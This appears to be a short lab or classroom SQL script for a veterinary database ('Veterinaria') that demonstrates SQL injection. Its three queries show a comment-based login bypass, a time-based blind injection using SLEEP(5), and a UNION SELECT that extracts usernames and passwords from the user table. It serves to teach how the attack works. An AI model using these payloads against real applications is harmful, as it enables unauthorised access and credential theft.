use Veterinaria;


select * from tbl_usuario where username = 'dlopez' -- '  and password = '12345'
;

select * from tbl_usuario where username = 'dlopez' OR SLEEP(5) -- ' and password = '123456'
;

select * from tbl_mascota where nombre like '%' UNION SELECT username, password FROM tbl_usuario; -- '